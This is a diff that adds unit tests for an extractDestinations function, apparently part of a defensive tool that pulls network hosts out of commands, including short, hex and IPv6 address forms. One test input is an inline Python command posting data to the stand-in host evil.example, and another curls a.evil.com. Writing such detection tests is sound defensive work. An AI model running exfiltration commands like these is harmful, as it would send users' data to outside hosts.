@@ -84,6 +84,24 @@ test("IPv4 destinations normalize to canonical form", () => {
   assert.deepEqual(extractDestinations({ command: "curl http://2130706433/x" }), ["127.0.0.1"]);
 });
 
+test("IPv4 short and hex forms are extracted and folded", () => {
+  assert.deepEqual(extractDestinations({ command: "curl http://127.1/x" }), ["127.0.0.1"]);
+  assert.deepEqual(extractDestinations({ command: "curl http://0x7f.1/x" }), ["127.0.0.1"]);
+  assert.deepEqual(extractDestinations({ command: "curl http://0177.0.0.1/x" }), ["127.0.0.1"]);
+});
+
+test("bare IPv6 literals are extracted; host:port-shaped text is not", () => {
+  assert.deepEqual(extractDestinations({ command: "curl http://2001:db8::1/x" }), ["2001:db8::1"]);
+  assert.deepEqual(extractDestinations({ command: "curl http://[2001:db8::1]/x" }), ["2001:db8::1"]);
+  // Time-like and port-like text cannot normalize to an address.
+  assert.deepEqual(extractDestinations({ command: "echo build 23:41:00 done" }), []);
+  assert.deepEqual(extractDestinations({ command: "grep -r cafe:babe:1 src" }), []);
+});
+
+test("quoted hosts terminate the scan (inline-code payloads)", () => {
+  assert.deepEqual(extractDestinations({ command: `python -c "requests.post('https://evil.example', data=x)"` }), ["evil.example"]);
+});
+
 test("deeply nested inputs are walked", () => {
   const hosts = extractDestinations({
     body: { rows: [{ cell: "curl https://a.evil.com" }] },
